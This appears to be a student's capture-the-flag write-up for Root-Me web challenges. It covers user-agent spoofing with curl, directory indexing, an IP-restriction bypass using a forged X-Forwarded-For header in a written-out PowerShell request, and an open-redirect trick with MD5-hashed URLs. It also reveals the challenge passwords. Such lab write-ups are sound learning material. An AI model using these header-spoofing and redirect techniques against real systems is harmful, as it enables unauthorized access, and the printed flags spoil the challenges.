#HTTP - User-agent

  Used curl -A "Admin" http://challenge01.root-me.org/web-serveur/ch2/ to reveal the password.

#HTTP- Directory indexing: Opened page source: 
 
Added /admin/pass.html to the url
Got rick rolled:
 
Then added just /admin to the base url
Found one more directory named backup and there was a admin.txt file having:
Password / Mot de passe : LINUX

#IP restriction bypass

Your IP ::ffff:172.232.118.60 do not belong to the LAN.
Intranet
Login: 

Password: 


You should authenticate because you're not on the LAN.
The website shows this.
I opened powershell and used:

(Invoke-WebRequest -Headers @{ "Host"="challenge01.root-me.org"; "X-Forwarded-For"="10.10.0.4" } -Uri "http://challenge01.root-me.org/web-serveur/ch68/" -UseBasicParsing).Content
 Response:
 '<!DOCTYPE html>
<html>
<head>
        <title>Secured Intranet</title>
</head>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
                        <h1>Intranet</h1>
                <div>
                        Well done, the validation password is: <strong>Ip_$po0Fing
</strong>
                </div>
        </body>
</html>'
From here we got the password.

#Open redirect

There are 3 buttons, named facebook, twitter and slack and it leads to the respective webites.
Upon inspecting, i noticed a bunch of characters with the url.
I chatgpted the chaacters and found that they were MD5 hash. Using a MDN5 hash converter, the hash reverses to the respective website link.
I created an element with the link of instagram and using the url of instagram I got the hash which i appened with the url.
The flag was revealef for a split second before redirecting to the instagram website.

